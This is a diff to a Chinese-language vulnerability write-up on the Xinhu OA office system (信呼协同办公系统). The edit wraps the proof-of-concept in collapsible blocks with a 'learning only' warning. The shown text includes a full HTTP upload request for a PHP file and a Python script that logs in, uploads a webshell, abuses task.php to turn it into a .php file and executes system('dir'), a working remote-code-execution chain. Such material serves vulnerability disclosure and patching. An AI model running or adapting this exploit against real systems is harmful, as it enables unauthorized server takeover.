@@ -47,8 +47,10 @@ app="信呼协同办公系统"
 
 上传1.php，记录filepath和id：
 
-```
-POST /index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=769871 HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=769871 HTTP/1.1
 Host: www.xinhu2.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
 Accept: */*
@@ -59,16 +61,17 @@ Content-Type:multipart/form-data; boundary=
 Content-Length: 250
 Origin: http://www.xinhu2.com
 Connection: close
-Referer:http://www.xinhu2.com/index.php?m=upload&d=public&callback=&upkey=20220513091317429617&showid=fileidview
+Referer:http://www.xinhu2.com/index.php?m=upload&amp;d=public&amp;callback=&amp;upkey=20220513091317429617&amp;showid=fileidview
 Cookie:deviceid=1650359786139;xinhu_mo_adminid=ye0xhh0xte0lp0yy0xtj0xtb0xtv0yy0xxt0jt0xtb0ye0yx0yp0le03;xinhu_ca_adminuser=admin;xinhu_ca_rempass=0;PHPSESSID=hp2qfqngssh75ij0r8j8kg6f47
 -----------------------------40605609116060410203660967062
 Content-Disposition: form-data; name="file"; filename="1.php"
 Content-Type: application/octet-stream
 
-<?php phpinfo(); ?>
+&lt;?php phpinfo(); ?&gt;
 
------------------------------40605609116060410203660967062--
-```
+-----------------------------40605609116060410203660967062--</code></pre>
+
+</details>
 
 查看1.php是否上传成功：
 
@@ -88,8 +91,10 @@ Upgrade-Insecure-Requests: 1
 
 ```
 http://<IP>/upload/2024-01/23_16071247.php
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞POC
 
 poc.py
@@ -98,24 +103,24 @@ poc.py
 # 1.php为webshell
 
 # 需要修改以下内容：
-# url_pre = 'http://<IP>/'
-# 'adminuser': '<ADMINUSER_BASE64>',
-# 'adminpass': '<ADMINPASS_BASE64>',
+# url_pre = 'http://&lt;IP&gt;/'
+# 'adminuser': '&lt;ADMINUSER_BASE64&gt;',
+# 'adminpass': '&lt;ADMINPASS_BASE64&gt;',
 
 import requests
 
 session = requests.session()
-url_pre = 'http://<IP>/'
-url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
-url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
-# url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=<ID>'
+url_pre = 'http://&lt;IP&gt;/'
+url1 = url_pre + '?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'
+url2 = url_pre + '/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'
+# url3 = url_pre + '/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;'
 data1 = {
     'rempass': '0',
     'jmpass': 'false',
     'device': '1625884034525',
     'ltype': '0',
-    'adminuser': '<ADMINUSER_BASE64>',
-    'adminpass': '<ADMINPASS_BASE64>',
+    'adminuser': '&lt;ADMINUSER_BASE64&gt;',
+    'adminpass': '&lt;ADMINPASS_BASE64&gt;',
     'yanzm': ''    
 }
 
@@ -125,11 +130,12 @@ filepath = str(r.json()['filepath'])
 filepath = "/" + filepath.split('.uptemp')[0] + '.php'
 print(filepath)
 id = r.json()['id']
-url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
+url3 = url_pre + f'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}'
 r = session.get(url3)
-r = session.get(url_pre + filepath + "?1=system('dir');")
-print(r.text)
-```
+r = session.get(url_pre + filepath + "?1=&#115;ystem('dir');")
+print(r.text)</code></pre>
+
+</details>
 
 ---
 
